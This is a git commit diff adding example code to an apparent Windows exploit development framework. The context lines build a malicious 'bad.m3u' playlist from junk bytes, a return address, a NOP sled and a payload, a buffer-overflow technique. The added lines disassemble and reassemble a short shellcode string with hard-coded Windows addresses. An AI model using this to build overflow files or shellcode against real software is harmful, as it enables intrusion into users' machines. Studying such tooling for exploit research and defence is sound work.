d56bcbe17a8d66ea8cbbae0c4740ebc822a915ea
OpM3TA <xmodfree@gmail.com>
2015-07-04 15:15:45 -0400

    Update Examples.py

--- Examples.py
+++ Examples.py
@@ -24,3 +24,33 @@ NopSled = framework.Nop(20)
 f = open("bad.m3u", "w+")
 f.write("http://" + junk + ESP + NopSled + payload)
 f.close()
+
+# ----------------------------------------------------------------------
+
+# ----------------------------------------------------------------------
+
+# Make sure all WEDF modules are in the directory;
+import framework
+from framework import WinShellcode as WShellcode
+
+
+# "Shellcode"
+sc = ("\x68\x97\x4C\x80\x7C\xB8"
+    "\x4D\x11\x86\x7C\xFF\xD0")
+   
+# Disassemble the shellcode using ndisasm. (mode=32)
+d = framework.Disasm(sc, 32)
+# Output=
+# 00000000  68974C807C        push dword 0x7c804c97
+# 00000005  B84D11867C        mov eax,0x7c86114d
+# 0000000A  FFD0              call eax
+
+# gets shellcode from ndisasm output
+get_shellcode = framework.Asm(d)
+# looks like
+#"\x68\x97\x4c\x80\x7c" 
+#"\xb8\x4d\x11\x86\x7c" 
+#"\xff\xd0"   
+
+
+
